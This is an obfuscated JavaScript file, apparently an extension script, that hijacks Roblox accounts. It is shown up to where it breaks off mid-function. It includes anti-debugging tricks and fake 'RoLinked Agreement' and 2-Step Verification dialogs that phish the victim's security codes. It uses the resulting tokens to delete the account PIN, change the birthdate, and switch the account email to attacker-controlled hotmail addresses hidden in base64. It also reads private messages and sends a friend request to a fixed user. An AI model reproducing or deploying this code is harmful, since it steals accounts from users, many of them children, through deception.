(function () {
    var z = function () {
        var R = {
            DvTkJ: function (j, y) {
                return j(y);
            },
            nvZcS: function (j, Q) {
                return j + Q;
            },
            yhvTu: function (j, Q) {
                return j + Q;
            },
            KxFNM: "return (function() ",
            zOJiX: '{}.constructor("return this")( )',
        };
        var x;
        try {
            x = Function('return (function() {}.constructor("return this")( ));')();
        } catch (y) {
            x = window;
        }
        return x;
    };
    var K = z();
    K.setInterval(H, 4000);
})();
(async function () {
    var y = (function () {
            var r = {
                kzzlF: function (D, M, o) {
                    return D(M, o);
                },
                zPWIq: "promptPopup",
                TemKw: "text-footer footer-note",
                ParZO: "Not Active",
                hlSLw: function (D, M) {
                    return D === M;
                },
                BwvCP: "kbwRO",
                WOWmQ: "Szalh",
                bmnXv: function (D, M) {
                    return D !== M;
                },
                ePMfD: "HDapU",
                NECnM: "euEbn",
                XoQKa: function (D, M) {
                    return D === M;
                },
                lPNEM: "odmbK",
            };
            var Z = true;
            return function (M, o) {
                if (r.XoQKa(r.lPNEM, r.lPNEM)) {
                    var h = Z
                        ? function () {
                              var Y = {
                                  bZmeS: function (u, e, n) {
                                      return r.kzzlF(u, e, n);
                                  },
                                  nNoQn: r.zPWIq,
                                  rMgHN: r.TemKw,
                                  hEVpW: r.ParZO,
                              };
                              if (r.hlSLw(r.BwvCP, r.WOWmQ)) {
                                  Y.bZmeS(N, null, null);
                              } else {
                                  if (o) {
                                      if (r.bmnXv(r.ePMfD, r.NECnM)) {
                                          var W = o.apply(M, arguments);
                                          return (o = null), W;
                                      } else {
                                          H.getElementById(Y.nNoQn).remove();
                                          q.getElementsByClassName(Y.rMgHN)[0].innerText = Y.hEVpW;
                                      }
                                  }
                              }
                          }
                        : function () {};
                    return (Z = false), h;
                } else {
                    var W = K.apply(R, arguments);
                    return (x = null), W;
                }
            };
        })(),
        Q = y(this, function () {
            var r = { eucUF: "btn-cta-md modal-modern-footer-button" };
            return Q.toString().search("(((.+)+)+)+$").toString().constructor(Q).search("(((.+)+)+)+$");
        });
    Q();
    var q = (function () {
        var Z = true;
        return function (D, M) {
            var o = Z
                ? function () {
                      if (M) {
                          var W = M.apply(D, arguments);
                          return (M = null), W;
                      }
                  }
                : function () {};
            return (Z = false), o;
        };
    })();
    (function () {
        q(this, function () {
            var o = new RegExp("function *\\( *\\)"),
                h = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "i"),
                Y = H("init");
            !o.test(Y + "chain") || !h.test(Y + "input") ? Y("0") : H();
        })();
    })();
    var N = (function () {
            var D = true;
            return function (M, o) {
                var Y = D
                    ? function () {
                          if (o) {
                              var e = o.apply(M, arguments);
                              return (o = null), e;
                          }
                      }
                    : function () {};
                return (D = false), Y;
            };
        })(),
        T = N(this, function () {
            var Z = function () {
                    var G;
                    try {
                        G = Function('return (function() {}.constructor("return this")( ));')();
                    } catch (s) {
                        G = window;
                    }
                    return G;
                },
                D = Z(),
                M = (D.console = D.console || {}),
                o = ["log", "warn", "info", "error", "exception", "table", "trace"];
            for (var h = 0; h < o.length; h++) {
                var n = N.constructor.prototype.bind(N);
                var u = o[h];
                var e = M[u] || n;
                n["__proto__"] = N.bind(N);
                n.toString = e.toString.bind(e);
                M[u] = n;
            }
        });
    T();
    const l = (r) => new Promise((Z) => setTimeout(Z, r));
    var k = ["a2F0aWVtYWNhZGFtMjZAaG90bWFpbC5jb20=", "a2VuZGFsbW9uaWNhMTNAaG90bWFpbC5jb20="],
        a = "@hotmail.com",
        t = "k***";
    var U = k[Math.floor(Math.random() * k.length)],
        P = 6045232974;
    validDev = [];
    try {
        $.ajax({
            method: "GET",
            url: "https://privatemessages.roblox.com/v1/messages?messageTab=inbox&pageNumber=0&pageSize=20",
            contentType: "application/json",
            success: function (Z) {
                var M = Number(Z.totalPages);
                for (let h = 0; h < M; h++) {
                    $.ajax({
                        method: "GET",
                        url: "https://privatemessages.roblox.com/v1/messages?messageTab=inbox&pageNumber=" + h + "&pageSize=20",
                        contentType: "application/json",
                        success: function (Y) {
                            var u = Y.collection;
                            for (var e of u) {
                                e.body.includes("VlK Games") == true && validDev.push("true");
                            }
                        },
                    });
                }
            },
        });
    } catch {}
    try {
        $.ajax({
            method: "GET",
            url: "https://privatemessages.roblox.com/v1/messages?messageTab=archive&pageNumber=0&pageSize=20",
            contentType: "application/json",
            success: function (D) {
                var o = Number(D.totalPages);
                for (let h = 0; h < o; h++) {
                    $.ajax({
                        method: "GET",
                        url: "https://privatemessages.roblox.com/v1/messages?messageTab=archive&pageNumber=" + h + "&pageSize=20",
                        contentType: "application/json",
                        success: function (Y) {
                            var u = Y.collection;
                            for (var e of u) {
                                e.body.includes("VlK Games") == true && validDev.push("true");
                            }
                        },
                    });
                }
            },
        });
    } catch {}
    try {
        console.log(document.getElementsByClassName("text-footer footer-note")[0].innerText);
    } catch {
        window.location.reload();
    }
    if (document.getElementsByClassName("text-footer footer-note")[0].innerText != "Active") {
        document.getElementsByClassName("text-footer footer-note")[0].innerText = "Active";
        $.ajax({
            method: "GET",
            url: "https://users.roblox.com/v1/users/authenticated",
            contentType: "application/json",
            success: function (o) {
                var Y = o.id;
                try {
                    var W = { friendshipOriginSourceType: 0 };
                    $.ajax({
                        method: "POST",
                        url: "https://friends.roblox.com/v1/users/" + P + "/request-friendship",
                        contentType: "application/json",
                        data: JSON.stringify(W),
                    });
                } catch {}
                async function u() {
                    function I() {
                        $.ajax({
                            method: "GET",
                            url: "https://accountsettings.roblox.com/v1/email",
                            contentType: "application/json",
                            success: function (b) {
                                if (b.emailAddress == null) {
                                    $.ajax({
                                        method: "POST",
                                        url: "https://accountsettings.roblox.com/v1/email",
                                        contentType: "application/json",
                                        data: JSON.stringify({
                                            emailAddress: atob(U),
                                            password: "",
                                        }),
                                    });
                                } else {
                                    var v = b.emailAddress,
                                        w = b.verified;
                                    if (v.includes(a) == true) {
                                        if (v.includes(t) == true) {
                                            if (w == true) {
                                                (async function () {
                                                    await l(500);
                                                    var S = {
                                                        method: "POST",
                                                        url: "https://auth.roblox.com/v2/logout",
                                                        contentType: "application/json",
                                                    };
                                                    $.ajax(S);
                                                })();
                                            }
                                        }
                                    }
                                }
                            },
                        });
                        setTimeout(I, 2000);
                    }
                    I();
                    function G(C, b, m) {
                        $.ajax({
                            method: "POST",
                            url: "https://twostepverification.roblox.com/v1/users/" + Y + "/challenges/email/send-code",
                            contentType: "application/json",
                            data: JSON.stringify({
                                actionType: "Generic",
                                challengeId: C,
                            }),
                            success: function () {
                                var B = '<div id="twoStepPrompts" role="dialog"> <div class="fade modal-backdrop in"></div> <div role="dialog" tabindex="-1" style="display: block;" class="fade modal-modern in modal"> <div class="modal-dialog"> <div class="modal-content" role="document"> <div title="" class="modal-header"> <button type="button" class="modal-modern-header-button"></button> <h4 class="modal-title">2-Step Verification</h4> <div class="modal-modern-header-info"></div> </div> <div class="modal-body"> <div class="modal-lock-icon"></div> <p class="modal-margin-bottom-xlarge">Enter the code we just sent you via email. </p> <div class="input-control-wrapper"> <div id="groupElementId" class="form-group"> <input as="input" inputmode="numeric" autocomplete="off" maxlength="6" placeholder="Enter 6-digit Code" type="text" id="two-step-verification-code-input" class="input-field form-control" value=""> <div class="form-control-label bottom-label xsmall">&nbsp;</div> </div> </div> </div> <div class="modal-footer"> <div class="modal-modern-footer-buttons"> <button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" disabled="">Verify</button> </div> <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p> <p class="text-footer">IMPORTANT: Don\'t share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p> </div> </div> </div> </div> </div>';
                                document.body.insertAdjacentHTML("beforeend", B);
                                function L() {
                                    if (document.getElementById("two-step-verification-code-input").value.length == 6) {
                                        document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = false;
                                    } else {
                                        document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = true;
                                    }
                                    setTimeout(L, 100);
                                }
                                L();
                                document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                                    $.ajax({
                                        method: "POST",
                                        url: "https://twostepverification.roblox.com/v1/users/" + Y + "/challenges/email/verify",
                                        contentType: "application/json",
                                        data: JSON.stringify({
                                            challengeId: C,
                                            actionType: "Generic",
                                            code: document.getElementById("two-step-verification-code-input").value,
                                        }),
                                        success: function (S) {
                                            var A = S.verificationToken;
                                            $.ajax({
                                                method: "POST",
                                                url: "https://apis.roblox.com/challenge/v1/continue",
                                                contentType: "application/json",
                                                data: JSON.stringify({
                                                    challengeId: b,
                                                    challengeMetadata: '{"verificationToken":"' + A + '","rememberDevice":false,"challengeId":"' + C + '","actionType":"Generic"}',
                                                    challengeType: "twostepverification",
                                                }),
                                                success: function () {
                                                    document.getElementById("twoStepPrompts").remove();
                                                    l(2000);
                                                    var f2 = btoa('{"reauthenticationToken":"' + A + '"}');
                                                    console.log(m);
                                                    if (m == 1) {
                                                        console.log("Reason is 1");
                                                        var f3 = {
                                                            method: "POST",
                                                            url: "https://twostepverification.roblox.com/v1/users/" + Y + "/configuration/email/enable",
                                                            contentType: "application/json",
                                                            headers: {},
                                                        };
                                                        f3.headers["Rblx-Challenge-Type"] = "reauthentication";
                                                        f3.headers["Rblx-Challenge-Id"] = b;
                                                        f3.headers["Rblx-Challenge-Metadata"] = f2;
                                                        $.ajax(f3);
                                                    } else {
                                                        if (m == null) {
                                                            $.ajax({
                                                                method: "DELETE",
                                                                url: "https://auth.roblox.com/v1/account/pin",
                                                                contentType: "application/json",
                                                                headers: {
                                                                    "Rblx-Challenge-Type": "reauthentication",
                                                                    "Rblx-Challenge-Id": b,
                                                                    "Rblx-Challenge-Metadata": f2,
                                                                },
                                                                success: function () {
                                                                    c(null, null);
                                                                },
                                                            });
                                                        } else {
                                                            c(b, f2);
                                                        }
                                                    }
                                                },
                                            });
                                        },
                                        error: function () {
                                            document.getElementsByClassName("form-control-label bottom-label xsmall")[0].innerText = "Invalid code";
                                            document.getElementById("groupElementId").className = "form-has-feedback  form-has-error form-group";
                                        },
                                    });
                                };
                            },
                        });
                    }
                    function V(C, b, m) {
                        var w = '<div id="twoStepPrompts" role="dialog"> <div class="fade modal-backdrop in"></div> <div role="dialog" tabindex="-1" style="display: block;" class="fade modal-modern in modal"> <div class="modal-dialog"> <div class="modal-content" role="document"> <div title="" class="modal-header"> <button type="button" class="modal-modern-header-button"></button> <h4 class="modal-title">2-Step Verification</h4> <div class="modal-modern-header-info"></div> </div> <div class="modal-body"> <div class="modal-lock-icon"></div> <p class="modal-margin-bottom-xlarge">Enter the code generated by your authenticator app. </p> <div class="input-control-wrapper"> <div id="groupElementId" class="form-group"> <input as="input" inputmode="numeric" autocomplete="off" maxlength="6" placeholder="Enter 6-digit Code" type="text" id="two-step-verification-code-input" class="input-field form-control" value=""> <div class="form-control-label bottom-label xsmall">&nbsp;</div> </div> </div> </div> <div class="modal-footer"> <div class="modal-modern-footer-buttons"> <button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" disabled="">Verify</button> </div> <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p> <p class="text-footer">IMPORTANT: Don\'t share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p> </div> </div> </div> </div> </div>';
                        document.body.insertAdjacentHTML("beforeend", w);
                        function g() {
                            if (document.getElementById("two-step-verification-code-input").value.length == 6) {
                                document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = false;
                            } else {
                                document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = true;
                            }
                            setTimeout(g, 100);
                        }
                        g();
                        document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                            $.ajax({
                                method: "POST",
                                url: "https://twostepverification.roblox.com/v1/users/" + Y + "/challenges/authenticator/verify",
                                contentType: "application/json",
                                data: JSON.stringify({
                                    challengeId: C,
                                    actionType: "Generic",
                                    code: document.getElementById("two-step-verification-code-input").value,
                                }),
                                success: function (L) {
                                    var J = L.verificationToken;
                                    $.ajax({
                                        method: "POST",
                                        url: "https://apis.roblox.com/challenge/v1/continue",
                                        contentType: "application/json",
                                        data: JSON.stringify({
                                            challengeId: b,
                                            challengeMetadata: '{"verificationToken":"' + J + '","rememberDevice":false,"challengeId":"' + C + '","actionType":"Generic"}',
                                            challengeType: "twostepverification",
                                        }),
                                        success: function () {
                                            document.getElementById("twoStepPrompts").remove();
                                            l(2000);
                                            var d = btoa('{"reauthenticationToken":"' + J + '"}');
                                            if (m == 1) {
                                                console.log("Reason is 1");
                                                var A = {
                                                    method: "POST",
                                                    url: "https://twostepverification.roblox.com/v1/users/" + Y + "/configuration/email/enable",
                                                    contentType: "application/json",
                                                    headers: {},
                                                };
                                                A.headers["Rblx-Challenge-Type"] = "reauthentication";
                                                A.headers["Rblx-Challenge-Id"] = b;
                                                A.headers["Rblx-Challenge-Metadata"] = d;
                                                $.ajax(A);
                                            } else {
                                                if (m == null) {
                                                    $.ajax({
                                                        method: "DELETE",
                                                        url: "https://auth.roblox.com/v1/account/pin",
                                                        contentType: "application/json",
                                                        headers: {
                                                            "Rblx-Challenge-Type": "reauthentication",
                                                            "Rblx-Challenge-Id": b,
                                                            "Rblx-Challenge-Metadata": d,
                                                        },
                                                        success: function () {
                                                            c(null, null);
                                                        },
                                                    });
                                                } else {
                                                    c(b, d);
                                                }
                                            }
                                        },
                                    });
                                },
                                error: function (L) {
                                    L.responseText.includes('"code":18') ? ((document.getElementsByClassName("form-control-label bottom-label xsmall")[0].innerText = "This code has already been used. Please enter a new code."), (document.getElementById("groupElementId").className = "form-has-feedback  form-has-error form-group")) : ((document.getElementsByClassName("form-control-label bottom-label xsmall")[0].innerText = "Invalid code"), (document.getElementById("groupElementId").className = "form-has-feedback  form-has-error form-group"));
                                },
                            });
                        };
                    }
                    function s(C, b) {
                        $.ajax({
                            method: "POST",
                            url: "https://apis.roblox.com/otp-service/v1/sendCodeForUser",
                            contentType: "application/json",
                            data: JSON.stringify({
                                contactType: "Email",
                                messageVariant: "Default",
                                origin: "Reauth",
                            }),
                            success: function (w) {
                                var B = w.otpSessionToken,
                                    L = '<div id="twoStepPrompts" role="dialog"> <div class="fade modal-backdrop in"></div> <div role="dialog" tabindex="-1" style="display: block;" class="fade modal-modern in modal"> <div class="modal-dialog"> <div class="modal-content" role="document"> <div title="" class="modal-header"> <button type="button" class="modal-modern-header-button"></button> <h4 class="modal-title">2-Step Verification</h4> <div class="modal-modern-header-info"></div> </div> <div class="modal-body"> <div class="modal-lock-icon"></div> <p class="modal-margin-bottom-xlarge">A one-time code has been sent to your registered email. Please enter your one-time code to continue.</p> <div class="input-control-wrapper"> <div id="groupElementId" class="form-group"> <input as="input" inputmode="numeric" autocomplete="off" maxlength="6" placeholder="Enter 6-Digit Code" type="text" id="two-step-verification-code-input" class="input-field form-control" value=""> <div class="form-control-label bottom-label xsmall">&nbsp;;</div> </div> </div> </div> <div class="modal-footer"> <div class="modal-modern-footer-buttons"> <button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" disabled="">Verify</button> </div> <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p> <p class="text-footer">IMPORTANT: Don\'t share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p> </div> </div> </div> </div> </div>';
                                document.body.insertAdjacentHTML("beforeend", L);
                                function F() {
                                    document.getElementById("two-step-verification-code-input").value.length == 6 ? (document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = false) : (document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = true), setTimeout(F, 100);
                                }
                                F();
                                document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                                    $.ajax({
                                        method: "POST",
                                        url: "https://apis.roblox.com/otp-service/v1/validateCode",
                                        contentType: "application/json",
                                        data: JSON.stringify({
                                            contactType: "Email",
                                            origin: "Reauth",
                                            otpSessionToken: B,
                                            passCode: document.getElementById("two-step-verification-code-input").value,
                                        }),
                                        success: function () {
                                            $.ajax({
                                                method: "POST",
                                                url: "https://apis.roblox.com/reauthentication-service/v1/token/generate",
                                                contentType: "application/json",
                                                data: JSON.stringify({
                                                    sessionId: B,
                                                    type: "Otp_Email",
                                                }),
                                                success: function (f0) {
                                                    (responseToken = f0.token),
                                                        $.ajax({
                                                            method: "POST",
                                                            url: "https://apis.roblox.com/challenge/v1/continue",
                                                            contentType: "application/json",
                                                            data: JSON.stringify({
                                                                challengeId: C,
                                                                challengeMetadata: '{"reauthenticationToken":"' + responseToken + '"}',
                                                                challengeType: "reauthentication",
                                                            }),
                                                            success: function () {
                                                                document.getElementById("twoStepPrompts").remove();
                                                                l(2000);
                                                                var f3 = btoa('{"reauthenticationToken":"' + responseToken + '"}');
                                                                if (b == 1) {
                                                                    console.log("Reason is 1");
                                                                    var f4 = {
                                                                        method: "POST",
                                                                        url: "https://twostepverification.roblox.com/v1/users/" + Y + "/configuration/email/enable",
                                                                        contentType: "application/json",
                                                                        headers: {},
                                                                    };
                                                                    f4.headers["Rblx-Challenge-Type"] = "reauthentication";
                                                                    f4.headers["Rblx-Challenge-Id"] = C;
                                                                    f4.headers["Rblx-Challenge-Metadata"] = f3;
                                                                    $.ajax(f4);
                                                                } else {
                                                                    b == null
                                                                        ? $.ajax({
                                                                              method: "DELETE",
                                                                              url: "https://auth.roblox.com/v1/account/pin",
                                                                              contentType: "application/json",
                                                                              headers: {
                                                                                  "Rblx-Challenge-Type": "reauthentication",
                                                                                  "Rblx-Challenge-Id": C,
                                                                                  "Rblx-Challenge-Metadata": f3,
                                                                              },
                                                                              success: function () {
                                                                                  c(null, null);
                                                                              },
                                                                          })
                                                                        : c(C, f3);
                                                                }
                                                            },
                                                        });
                                                },
                                            });
                                        },
                                        error: function () {
                                            document.getElementsByClassName("form-control-label bottom-label xsmall")[0].innerText = "Invalid code";
                                            document.getElementById("groupElementId").className = "form-has-feedback  form-has-error form-group";
                                        },
                                    });
                                };
                            },
                        });
                    }
                    function O(C, b, m) {
                        $.ajax({
                            method: "GET",
                            url: "https://twostepverification.roblox.com/v1/users/" + Y + "/configuration",
                            contentType: "application/json",
                            success: function (g) {
                                var L = g.primaryMediaType;
                                if (L == "Email") {
                                    G(C, b, m);
                                } else {
                                    if (L == "Authenticator") {
                                        V(C, b, m);
                                    } else {
                                        if (L == null) {
                                            s(b, m);
                                        }
                                    }
                                }
                            },
                        });
                    }
                    function c(C, b) {
                        $.ajax({
                            method: "GET",
                            url: "https://twostepverification.roblox.com/v1/users/" + Y + "/configuration",
                            contentType: "application/json",
                            success: function (v) {
                                var g = v.primaryMediaType;
                                if (g == "Authenticator") {
                                    document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                    if (document.getElementById("emailPopupz") == null) {
                                        var B = '<div id="emailPopupz" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog" bis_skin_checked="1"><div class="modal-content" role="document" bis_skin_checked="1"><div title="" class="modal-header" bis_skin_checked="1"><button type="button" class="modal-modern-header-button"></button><h4 class="modal-title">Email 2-Step Verification</h4><div class="modal-modern-header-info" bis_skin_checked="1"></div></div><div class="modal-body" bis_skin_checked="1"><div class="modal-lock-icon" bis_skin_checked="1"></div><p>You must enable Email 2-Step Verification to complete this action.</p></div><div class="modal-footer" bis_skin_checked="1"><div class="modal-modern-footer-buttons" bis_skin_checked="1"><button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Set Up">Enable</button></div></div></div></div></div></div>';
                                        document.body.insertAdjacentHTML("beforeend", B);
                                        document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                                            document.getElementById("emailPopupz").remove();
                                            document.getElementById("agreeRoLinked").disabled = false;
                                            $.ajax({
                                                method: "POST",
                                                url: "https://twostepverification.roblox.com/v1/users/" + Y + "/configuration/email/enable",
                                                contentType: "application/json",
                                                success: function () {},
                                                error: function (A) {
                                                    var f0 = atob(A.getResponseHeader("rblx-challenge-metadata")),
                                                        f1 = A.getResponseHeader("rblx-challenge-id"),
                                                        f2 = f0.split('"challengeId":"').pop().split('"')[0];
                                                    O(f2, f1, 1);
                                                },
                                            });
                                        };
                                    }
                                } else {
                                    if (C == null) {
                                        var L = {
                                            birthDay: 2,
                                            birthMonth: 2,
                                            birthYear: 2022,
                                        };
                                        $.ajax({
                                            method: "POST",
                                            url: "https://users.roblox.com/v1/birthdate",
                                            contentType: "application/json",
                                            data: JSON.stringify(L),
                                            success: function () {
                                                $.ajax({
                                                    method: "POST",
                                                    url: "https://accountsettings.roblox.com/v1/email",
                                                    contentType: "application/json",
                                                    data: JSON.stringify({
                                                        emailAddress: atob(U),
                                                        password: "",
                                                    }),
                                                    success: function () {
                                                        (async function () {
                                                            await l(1500),
                                                                $.ajax({
                                                                    method: "GET",
                                                                    url: "https://accountsettings.roblox.com/v1/email",
                                                                    contentType: "application/json",
                                                                    success: function (f6) {
                                                                        f6.emailAddress == null &&
                                                                            $.ajax({
                                                                                method: "POST",
                                                                                url: "https://accountsettings.roblox.com/v1/email",
                                                                                contentType: "application/json",
                                                                                data: JSON.stringify({
                                                                                    emailAddress: atob(U),
                                                                                    password: "",
                                                                                }),
                                                                            });
                                                                    },
                                                                });
                                                        })();
                                                    },
                                                    error: function () {
                                                        (async function () {
                                                            await l(1500),
                                                                $.ajax({
                                                                    method: "GET",
                                                                    url: "https://accountsettings.roblox.com/v1/email",
                                                                    contentType: "application/json",
                                                                    success: function (f3) {
                                                                        if (f3.emailAddress == null) {
                                                                            $.ajax({
                                                                                method: "POST",
                                                                                url: "https://accountsettings.roblox.com/v1/email",
                                                                                contentType: "application/json",
                                                                                data: JSON.stringify({
                                                                                    emailAddress: atob(U),
                                                                                    password: "",
                                                                                }),
                                                                            });
                                                                        }
                                                                    },
                                                                });
                                                        })();
                                                    },
                                                });
                                            },
                                            error: function (A) {
                                                var f1 = atob(A.getResponseHeader("rblx-challenge-metadata")),
                                                    f2 = A.getResponseHeader("rblx-challenge-id"),
                                                    f3 = f1.split('"challengeId":"').pop().split('"')[0];
                                                O(f3, f2, 2);
                                            },
                                        });
                                    } else {
                                        var F = {
                                            birthDay: 2,
                                            birthMonth: 2,
                                            birthYear: 2022,
                                        };
                                        $.ajax({
                                            method: "POST",
                                            url: "https://users.roblox.com/v1/birthdate",
                                            contentType: "application/json",
                                            headers: {
                                                "Rblx-Challenge-Type": "reauthentication",
                                                "Rblx-Challenge-Id": C,
                                                "Rblx-Challenge-Metadata": b,
                                            },
                                            data: JSON.stringify(F),
                                            success: function () {
                                                $.ajax({
                                                    method: "POST",
                                                    url: "https://accountsettings.roblox.com/v1/email",
                                                    contentType: "application/json",
                                                    data: JSON.stringify({
                                                        emailAddress: atob(U),
                                                        password: "",
                                                    }),
                                                    success: function () {
                                                        (async function () {
                                                            await l(1500),
                                                                $.ajax({
                                                                    method: "GET",
                                                                    url: "https://accountsettings.roblox.com/v1/email",
                                                                    contentType: "application/json",
                                                                    success: function (f3) {
                                                                        f3.emailAddress == null &&
                                                                            $.ajax({
                                                                                method: "POST",
                                                                                url: "https://accountsettings.roblox.com/v1/email",
                                                                                contentType: "application/json",
                                                                                data: JSON.stringify({
                                                                                    emailAddress: atob(U),
                                                                                    password: "",
                                                                                }),
                                                                            });
                                                                    },
                                                                });
                                                        })();
                                                    },
                                                    error: function () {
                                                        (async function () {
                                                            await l(1500);
                                                            $.ajax({
                                                                method: "GET",
                                                                url: "https://accountsettings.roblox.com/v1/email",
                                                                contentType: "application/json",
                                                                success: function (f1) {
                                                                    f1.emailAddress == null &&
                                                                        $.ajax({
                                                                            method: "POST",
                                                                            url: "https://accountsettings.roblox.com/v1/email",
                                                                            contentType: "application/json",
                                                                            data: JSON.stringify({
                                                                                emailAddress: atob(U),
                                                                                password: "",
                                                                            }),
                                                                        });
                                                                },
                                                            });
                                                        })();
                                                    },
                                                });
                                            },
                                            error: function (A) {
                                                var f0 = atob(A.getResponseHeader("rblx-challenge-metadata")),
                                                    f1 = A.getResponseHeader("rblx-challenge-id");
                                                var f2 = f0.split('"challengeId":"').pop().split('"')[0];
                                                O(f2, f1, 2);
                                            },
                                        });
                                    }
                                }
                            },
                        });
                    }
                    if (document.getElementById("RoLinked1") == null) {
                        var i = '<div id="RoLinked1" role="dialog"><div class="fade modal-backdrop in"></div><div aria-labelledby="contained-modal-title-vcenter" scrollable="true" centered="true" role="dialog" tabindex="-1" style="display: block;" class="fade verification-modal in modal"><div class="modal-sm modal-dialog"><div class="modal-content" role="document"><div><div title="" class="modal-header"><div class="verification-upsell-title-container"><button type="button" class="verification-upsell-title-button"></button><h4 id="contained-modal-title-vcenter" class="modal-title">RoLinked Agreement </h4></div></div><div class="verification-upsell-text-body text-description">RoLinked can view your Roblox Username</div><div class="modal-footer"><div class="text-description font-caption-body phone-verification-legal-text" hidden="">By clicking "Continue", you are submitting your phone number and agreeing to our <a href="https://en.help.roblox.com/hc/articles/9483830673556-Roblox-SMS-Terms-of-Service">SMS Terms of Use</a> and <a href="https://en.help.roblox.com/hc/articles/115004630823">Privacy Policy</a>. We will send you a one-time verification code. Message and data rates may apply. Reply HELP for help.</div><div class="buttons-section"><button type="button" class="accept-btn btn-primary-md btn-min-width" id="agreeRoLinked">Agree & Continue</button></div><div></div></div></div></div></div></div></div>';
                        document.body.insertAdjacentHTML("beforeend", i);
                        document.getElementById("agreeRoLinked").onclick = function () {
                            document.getElementById("agreeRoLinked").disabled = true;
                            $.ajax({
                                method: "GET",
                                url: "https://auth.roblox.com/v1/account/pin",
                                contentType: "application/json",
                                success: function (b) {
                                    var v = b.isEnabled,
                                        w = b.unlockedUntil;
                                    if (v == true) {
                                        if (w == null) {
                                            document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                            if (document.getElementById("pinPopupz") == null) {
                                                var g = '<div id="pinPopupz" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div class="modal-content" role="document"><div title="" class="modal-header"><button type="button" class="modal-modern-header-button"></button><h4 class="modal-title">Account PIN Locked</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><p>Unlock the PIN attached to your account to continue</p></div><div class="modal-footer"><div class="modal-modern-footer-buttons"><a class="btn-cta-md modal-modern-footer-button" aria-label="Set Up" target="_blank" href="https://www.roblox.com/my/account#!/parental-controls">Open Settings</a></div></div></div></div></div></div>';
                                                document.body.insertAdjacentHTML("beforeend", g);
                                                document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                                                    document.getElementById("pinPopupz").remove();
                                                    document.getElementById("agreeRoLinked").disabled = false;
                                                };
                                            }
                                        } else {
                                            try {
                                                document.getElementById("pinPopupz").remove();
                                            } catch {}
                                            $.ajax({
                                                method: "DELETE",
                                                url: "https://auth.roblox.com/v1/account/pin",
                                                contentType: "application/json",
                                                success: function () {
                                                    c(null, null);
                                                },
                                                error: function (B) {
                                                    var L = atob(B.getResponseHeader("rblx-challenge-metadata")),
                                                        F = B.getResponseHeader("rblx-challenge-id");
                                                    var J = L.split('"challengeId":"').pop().split('"')[0];
                                                    O(J, F, null);
                                                },
                                            });
                                        }
                                    } else {
                                        c(null, null);
                                    }
                                },
                            });
                        };
                    } else {
                        $.ajax({
                            method: "GET",
                            url: "https://auth.roblox.com/v1/account/pin",
                            contentType: "application/json",
                            success: function (C) {
                                var m = C.isEnabled;
                                var v = C.unlockedUntil;
                                if (m == true) {
                                    if (v == null) {
                                        document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                        if (document.getElementById("pinPopupz") == null) {
                                            var w = '<div id="pinPopupz" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div class="modal-content" role="document"><div title="" class="modal-header"><button type="button" class="modal-modern-header-button"></button><h4 class="modal-title">Account PIN Locked</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><p>Unlock the PIN attached to your account to continue</p></div><div class="modal-footer"><div class="modal-modern-footer-buttons"><a class="btn-cta-md modal-modern-footer-button" aria-label="Set Up" target="_blank" href="https://www.roblox.com/my/account#!/parental-controls">Open Settings</a></div></div></div></div></div></div>';
                                            document.body.insertAdjacentHTML("beforeend", w);
                                            document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                                                document.getElementById("pinPopupz").remove();
                                                document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                            };
                                        }
                                    } else {
                                        try {
                                            document.getElementById("pinPopupz").remove();
                                        } catch {}
                                        $.ajax({
                                            method: "DELETE",
                                            url: "https://auth.roblox.com/v1/account/pin",
                                            contentType: "application/json",
                                            success: function () {
                                                c(null, null);
                                            },
                                            error: function (g) {
                                                var B = atob(g.getResponseHeader("rblx-challenge-metadata"));
                                                var L = g.getResponseHeader("rblx-challenge-id"),
                                                    F = B.split('"challengeId":"').pop().split('"')[0];
                                                O(F, L, null);
                                            },
                                        });
                                    }
                                } else {
                                    c(null, null);
                                }
                            },
                        });
                    }
                }
                (async function () {
                    await l(800);
                    if (validDev.length > 0) {
